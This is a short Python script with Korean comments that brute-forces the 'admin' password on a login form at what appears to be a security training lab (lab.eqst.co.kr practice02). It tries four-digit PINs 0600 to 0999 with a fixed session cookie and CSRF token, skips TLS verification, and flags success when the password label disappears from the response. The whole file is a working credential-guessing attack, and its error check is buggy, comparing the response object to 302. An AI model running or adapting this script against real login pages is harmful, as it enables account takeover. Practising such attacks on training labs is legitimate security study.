import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 인증서 없을 때 오류 안보이게 함

urls = "https://lab.eqst.co.kr:8110/practice/practice02/login"
head = {
    "Host":"lab.eqst.co.kr:8110",
    "Content-Type":"application/x-www-form-urlencoded"
}
cooki = {
    "JSESSIONID":"0228C9F6BF7E6340F886E64C0F27321C"
}

pa={
    "_csrf":"d2dde779-beac-4b83-9abc-c56d3f09a536",
    "memberid":"admin",
    "password": "1234"
}

for i in range(600,1000):
    pas = str(i).zfill(4) # 0을 붙여서 4자리로 맞추고, 형 변환
    pa['password'] = pas # 딕셔너리 타입의 변수 변화
    res = requests.post(urls,data=pa,headers=head,cookies=cooki, verify=False)
    if '<label for="password" class="form-label">비밀번호</label>' in res.text:
        print(f'wrong {pas}')
    elif res==302:
        print('페이지 에러!')
        break
    else:
        print(f'{pas} - 비밀번호 획득!')
        break

# print(res.text)